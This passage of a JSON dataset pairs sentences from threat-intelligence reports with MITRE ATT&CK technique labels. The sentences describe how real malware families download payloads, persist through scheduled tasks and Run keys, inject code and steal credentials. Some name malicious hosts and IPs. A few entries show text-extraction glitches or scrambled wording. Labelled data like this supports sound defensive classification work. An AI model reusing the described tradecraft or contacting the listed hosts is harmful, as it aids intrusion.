    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The #le collects system information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "invokes a WMI instance in the rootsecuritycenter namespace to identify security products installed on the system",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "In addition to the WMI/wql use, it also hunts through the \"SOFTWAREMicrosoftWindowsCurrentVersionUnin stall\" registry key looking for security products to avoid.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "The code collects information about the system and xml formats this data prior to encryption for proper parsing:",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The attackers send commands and new modules to be executed to the victims through the C&Cs.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Oxford websites to deliver malware to the victims",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "\"Agent Injector\" (Trojan with the specific purpose of installing the ISMAgent backdoor)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "They tried to deliver a new Trojan called OopsIE, via using a variant of the ThreeDollars delivery document",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "They also created a new remote administration tool that supported HTTP and DNS communication",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "From there they asked victims to open malicious documents.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Twoface - A web shell, which is used to harvest credentials",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the attackers inserted macros into the documents designed to install a malware downloader on the system. Successful exploitation would result in the download of a PNG image file from a compromised webserver.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The PowerDuke backdoor boasts a pretty extensive list of features that allow the Dukes to examine and control a system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "a file named survey.xls that was designed to look like an employee satisfaction survey tailored to either Westat employees or Westat customers",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "extracts a \"Client update.exe\" executable file and installs it to \"C:Users<User>valsClient update.exe\"",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the crtt function creates a scheduled task \"CheckUpdate\" that runs the unpacked executable five minutes after being infected by it, as well as on future log-ons.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "TONEDEAF is a backdoor that communicates with its Command and Control server via HTTP in order to receive and",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The backdoor uses HTTP for C2 communication",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Only Chrome password dumping is now supported, although interestingly the use of the file \"fsociety.dat\" as a password data store under the \"AppData\\Roaming\" directory stayed the same.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "the 'WinExec' function is successfully called to create a child process, \"mshta.exe\", in the context of current logged on user",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The process \"mshta.exe\" downloads a malicious script from hxxp://mumbai-m[.]site/b.txt and executes it,",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The malware creates a child process, \"mshta.exe,\"",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "which downloads a &le from: hxxp://mumbai-m[.]site/b.txt.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "to download a dropper from: hxxp://dns-update[.]club/v.txt.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell command also renames the downloaded &le from v.txt to v.vbs and executes the script.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The v.vbs script drops four components (hUpdateCheckers.base, dUpdateCheckers.base, cUpdateCheckers.bat, and GoogleUpdateschecker.vbs) to the directory: C:\\ProgramData\\Windows\\Microso\"\\java\\",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "cUpdateCheckers.bat is launched and creates a scheduled task for GoogleUpdateschecker.vbs persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "cUpdateCheckers.bat and *.base are deleted from the staging directory.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the Task Scheduler will launch GoogleUpdateschecker.vbs every minute",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "POWRUNER is executed every minute by the Task Scheduler",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "POWRUNER begins by sending a random GET request to the C2 server and waits for a response",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "POWRUNER may also receive batch commands from the C2 server to collect host information from the system. This may include information about the currently logged in user, the hostname, network con&guration data, active connections, process information, local and domain administrator accounts, an enumeration of user directories, and other data.",
    "command": "",
    "labels": [
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Backdoor tools",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Graphical User Interface that allows actors to issue commands, upload and download files to Agents via the Server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The panel allows the actors to issue commands in addition to uploading files to and downloading files from the compromised endpoints.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Poison Frog server handles both the HTTP and DNS tunneling channels used by thehUpdater.ps1anddUpdater.ps1scripts.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "To use this functionality, the actor must provide information within the \"Target Computer\" portion of the webshell, specifically a network administrator username and password, as well as a list of IP addresses of remote systems added in the \"Select Computer\" drop down",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The webshell will save the archives locally to the server in theC:\\Users\\Public\\Libraries\\Recorded\\Filesfolder,",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "remote desktop (RDP) sessions showing the Glimpse panel",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "malicious Microsoft Word document namedJob-Details.doc",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Verification that there is a mouse connected to the PC (Anti-Sandboxing technique)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Initial fingerprinting of the target device and sending of the information to the C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Registering a Windows schedule task that would launch the executable every X minutes.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "derived from the PC information",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The functionality of the backdoor includes download, upload and shell command execution",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Persistence is achieved in the1ststage, when the schedule task is registered. The scheduled task namedSystemFailureReporter will execute the2ndstage payload every 5 minutes",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The backdoor starts by collecting basic information about the victim's machine and calculating a 4-byte long victim identifier, based on the user-name, computer-name and the domain name of the target environment.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "the attached Excel file contained a confirmation form for the targeted diplomat to fill out",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "this one uses WMI ]Windows Management Instrumentation) to ping the C2 server instead of a more commonly used tool, such as PowerShell or CMD",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The malware authors also used the Excel macro to create a persistence method for their update.exe file. They accomplished this by setting a scheduled task",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "other program states require it to contact the C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This malware has the ability to take a DNS response and create an arbitrary file on the infected machine if that was the task the malware authors wanted to perform. File and CompressedFile are task types used to create a file",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "through the Windows CMD interpreter",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The Excel attachment contains a macro that performs malicious activities",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "it uses the following WMI query to get the IP address of the request",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Creates a TaskService object and Gets the task folder that contains the list of the current tasks",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Checks the existence of theUpdate.exeCle",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "it writes it using a technique that loads a DotNet assembly directly using mscorlib and Assembly.Load by manually accessing the VTable of the IUnknown",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "DeCnes a xml schema for a scheduled task and registers it using the RegisterTask function. The name of the scheduled task is MicrosoftUpdate and is used to make update.exepersistent",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "scheduled task that would launch the executable every X minutes",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "UNC1878 obtains credentials using Mimikatz, LaZagne and Kerbrute",
    "command": "",
    "labels": [
      "T1003.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "extended their access by connecting to network shares and directly to systems over RDP",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "into a directory they create named \"share$",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "through the use of the Emotet",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A reverse shell is downloaded and executed on the compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Lateral movement throughout the network is enabled using Remote Desktop Protocol (RDP)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Service User Accounts are created",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Batch scripts are executed to terminate processes/services and remove backups, followed by the Ryuk binary",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, the dropper constructs an installation folder path. The folder path is created by calling GetWindowsDirectoryWand then inserting a null byte at the fourth character of the path. This is used to create a string that contains the drive letter path",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Ryuk executable payload deleting the dropper when executed",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "If the host operating system is Windows XP or earlier, the stringDocuments and Settings\\Default User\\is appended to the drive letter path. If the host is Windows Vista or newer, the stringusers\\Public\\is appended to the drive letter path. For Windows XP, an example folder path would beC:\\Documents and Settings\\Default User\\,and for Window Vista or higher, the path would be C:\\Users\\Public",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The dropper checks whether the host is 32-bit or 64-bit by callingIsWow64Processand writes one of two embedded payload executables corresponding to the host's architecture",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The newly written executable is then run by callingShellExecuteW",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Ryuk created a registry entry under the Run key using Windowscmd.exeshell.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Ryuk also callsCreateToolhelp32Snapshotto enumerate all running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Ryuk will inject itself into this single process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The COZY BEAR intrusion relied primarily on the SeaDaddy implant developed in Python and compiled with py2exe and another Powershell backdoor with persistence accomplished via Windows Management Instrumentation (WMI) system, which allowed the adversary to launch malicious code automatically after a specified period of system uptime or on a specific schedule.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "downloads additional powershell modules from it",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "download and deploy Trickbot on the user's machine",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "once activated",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Remote Desktop Protocol (RDP)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The module will send the required data via POST, which is configured through a downloaded configuration file using the filename \"dpost.\"",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "it queries the registry key Software\\SimonTatham\\Putty\\Sessions to identify the saved connection settings",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "To retrieve the PuTTY credentials, it queries the registry key Software\\SimonTatham\\Putty\\Sessions to identify the saved connection settings, which allows the module to retrieve information such as the Hostname and Username, and Private Key Files used for authentication.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Further forensic analysis took us to the point of initial infection: a spear phishing e-mail with a CPL attachment; although in other cases Word documents exploiting known vulnerabilities were used",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "After executing the shellcode, a backdoor based on Carberp, is installed on the system",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "infected computers were used to record videos that were then sent to the Command and Control servers",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Upon opening the attachment",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "multiple malicious files were created or downloaded allowing the attackers to gain some level of access into the victim's infrastructure.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Data from section \"last\" is written into registry perhaps to keep track of last executed command",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "allowed attackers to gain Domain or even Enterprise Admin access",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Cloud services such as Google Docs and Google Forms were involved allowing attackers to keep track of infected systems, spread malware and perform further malicious activities",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "performing separate information gathering, data exfiltration and communication with a command and control (C&C) server",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "CozyDuke is a highly versatile, modular, malware \"platform\" whose functionality lies not in a single core component but in an array of modules that it may be instructed to download from its C&C server. These modules are used to selectively provide CozyDuke with just the functionality deemed necessary for the mission at hand.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "one of these modules gathers system information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "They would then use the toolset to gather initial information on the victims",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The PinchDuke information stealer gathers system configuration information, steals user credentials, and collects user files from the compromised host transferring these via HTTP(S) to a C&C server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Unlike CosmicDuke and PinchDuke, GeminiDuke primarily collects information on the victim computer's configuration. The collected details include: •Local user accounts •Network settings Internet proxy settings • Installed drivers • •Running processes •Programs previously executed by users •Programs and services configured to automatically run at startup •Values of environment variables •Files and folders present in any users home folder •Files and folders present in any users My Documents •Programs installed to the Program Files folder •Recently accessed files, folders and programs",
    "command": "",
    "labels": [
      "T1005",
      "T1016",
      "T1057",
      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "CosmicDuke's information stealing functionality includes: •Keylogging •Taking screenshots •Stealing clipboard contents •Stealing user files with file extensions that match a predefined list •Exporting the users cryptographic certificates including private keys •Collecting user credentials, including passwords, for a variety of popular chat and email programs as well as from web browsers",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "This component can be instructed by the C&C server to download and execute arbitrary modules",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Known CozyDuke modules include: •Command execution module for executing arbitrary Windows Command Prompt commands •Password stealer module •NT LAN Manager (NTLM) hash stealer module •System information gathering module •Screenshot module",
    "command": "",
    "labels": [
      "T1059.003",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SeaDuke is a simple backdoor that focuses on executing commands retrieved from its C&C server, such as uploading and downloading files, executing system commands and evaluating additional Python code.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The CloudDuke downloader will download and execute additional malware from a preconfigured location. Interestingly, that location may be either a web address or a Microsoft OneDrive account.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "encouraging  the  intended  victim  to  open  the email  attachment  and  click  inside  it",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Persistence  is established  by  creating  a  scheduled  task  that runs the main malware file every 25 minutes",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "the  victim's  system information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "list  of  currently  running processes back to the attacker",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "the  malware  uses \"http  POST\"  to  send  data  that  has  been retrieved/stolen  from  the  infected  system  to the CnC server",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "to folderand The  attacking  system  reads  the  log  file  and uses  its  contents  to  then  transfer  a  32-bit  or thevictim's 64-bitexecutable file it. run C:\\Windows\\Temp",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ThemeterpreterDLL ismade operational  via  reflective  DLL  injection,  which copies  the  meterpreter  DLL  into  the  memory space  of  a  chosen  victim  process  (such  as explorer.exe) and runs it as a thread.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The  {~random}  file  names  are  not  really random,  but  instead  a  base64  combination  of the  victim's  system  volume  serial  number  and MAC  address,  which  are  obtained  by  queries to  the  system's  WMI  Service",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "written into memory as a thread, and executed.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "When the document is opened the targeted user is lured into double-clicking on the embedded object which is disguised as an image",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Double clicking on the image results in a file open dialog for \"unprotected.vbe\". If the user executes this file then the malware will begin to execute.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The \"ggldr\" script will send and receive commands to and from Google Apps Script, Google Sheets, and Google Forms",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "enable remote desktop",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The malware collects basic system information",
    "command": "",
    "labels": [
      "T1005",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "It is used to download next-stage payloads when systems of interest are identified",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "JS Flash capabilities closely resemble those of VB Flash and leverage interesting techniques in deployment via batch scripts embedded as OLE objects in malicious documents",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "ability to downloadTinyMet(a cutdown of theMetasploit Meterpreterpayload)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "download arbitrary scripts and executables, deploy TinyMet",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collect victim system information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "they have used macros and OLE embedded objects",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "If the attachments were executed",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "that eventually download and execute a dropper",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The email attachments exploit vulnerabilities in Microsoft Office 2003, 2007 and 2010 (CVE-2012-0158 and CVE-2013-3906) and Microsoft Word (CVE-2014- 1761). Once the vulnerability is successfully exploited, the shellcode decrypts and executes the backdoor known as Carbanak.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "install the same Carberp-like malware",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once the remote code execution vulnerability is successfully exploited, it installs Carbanak on the victim's system",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The spear phishing email messages appeared legitimate and in some cases were sent from compromised coworkers´ accounts",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The original file created by the exploit payload is then deleted.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Carbanak determines if either the avp.exe or avpui.exe processes (components of Kaspersky Internet Security) is running.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Carbanak injects its code into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "it modifies the executable code in memory in order to establish simultaneous work processes for both remote and local users",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "If Carbanak detects the banking application BLIZKO (funds transfer software) in the infected computer",
    "command": "",
    "labels": [
      "T1057",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "identify critical documents",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Once the user attempts to open the attached documents,",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "the attacks use reconnaissance tools designed to assess the state of the victim's workstation and determine what tools should be downloaded next",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "16:48 – one of the employees opened the document within the spear-phishing email 16:49 – a second employee opened the same tainted document",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Credentials for one Domain Administrator were compromised and used throughout the duration of the attack",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The attack flow leaves behind a temporary file",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "after the opening of the original document file, downloaded from the malicious URL mentioned above",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "KbhpQIcahFCuZwq.sct - (bb784d55895db10b67b1b4f1f5b0be16) This object was not found on disk, it was deleted after running by \"MGsCOxPSNK.txt\".",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the malicious payload is being dropped",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "tCrrDqBQoCcEkbnK.txt (581c2a76b382deedb48d1df077e5bdf1) This object can be found at the path: C:\\Users\\[redacted]\\AppData\\Local\\Temp\\tCrrDqBQoCcEkbnK.txt. It is a configuration file for cmstp.exe. It downloads a DLL dropper from \"cloud[.]yourdocument[.]biz/robots.txt\"",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the  DLL  will self-delete.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the binary tried to download a JavaScript backdoor from the Command and Control server (C&C)\"nl[.][redacted][.]kz/robots.txt\"and saved the file to\"%APPDATA%\\9D01CA.txt\"",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The file \"9D01CA.txt\"sent an initial fingerprint of the system compromised which contained the name of the antivirus solution installed on the system, the local IP address, username, computername and OS version",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The email attachment was a malicious Word Document",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "stealing system information",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "to download additional malware",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The victim system will then reach out to http://95.215.47.105 to retrieve additional malware called AdobeUpdateManagementTool.vbs",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Adds file to WindowsUpdate folder: vbs",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Adds persistence mechanism to the CURRENT_USER registry hive in the CurrentVersion\\Run and CurrentVersion\\RunOnce keys to autostart AdobeUpdateManagementTool.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "A scheduled task is created named SysChecks which calls the vbs",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The malware contacts the following and may attempt to download doc:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This malware was capable of stealing significant system and network information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "It was also used to download several other reconnaissance tools to map out the network.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "it also downloaded additional malware that enables the next stage of the attack",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Beaconing messages are sent out to 179.43.133.34 via standard HTTP GET requests every 5 minutes",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This malware executes a new iteration of svchost.exe and injects its malicious code into this running process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It then searches Kaspersky antivirus processes and terminates them if running on the victim system.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "it registers itself as a service with the following details: Service name: RpcSsSys (this name is random, may vary on different system)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "It communicates via an encrypted tunnel on port 443",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "email addresses from the PST file",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "download / execute additional malware",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The dropped VBE file is a loader script that drops, installs and executes",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This is then saved to a file named \"AdobeUpdateManagementTool.vbs\" into the \"\\WindowsUpdate_\" folder",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A persistence registry key is also created by the loader script: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The loader script adds a scheduled task with a task named \"SysChecks\". The purpose of this scheduled task is to run the payload script (AdobeUpdateManagementTool.vbs) in every 5 minutes",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Steal system information System Name System Manufacturer System Model Time Zone Total Physical Memory Processor System Type Processor BIOS Version Networking information Computer name Domain User name",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "It may also be able to receive additional malware executables and install them on the victim's computer.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It can receive commands from the attacker to download and execute EXE files, VBScript, or Powershell script files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "it writes the cmdunig value to this registry key: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Following is the System information sent to the control server when the command \"INFO\" is received from the attacker. OS Name Version Service Pack OS Manufacturer Windows Directory Locale Available Physical Memory Total Virtual Memory Available Virtual Memory System Name System Manufacturer System Model Time Zone Total Physical Memory Processor System Type Processor BIOS Version Computer name Domain User name",
    "command": "",
    "labels": [
      "T1082"
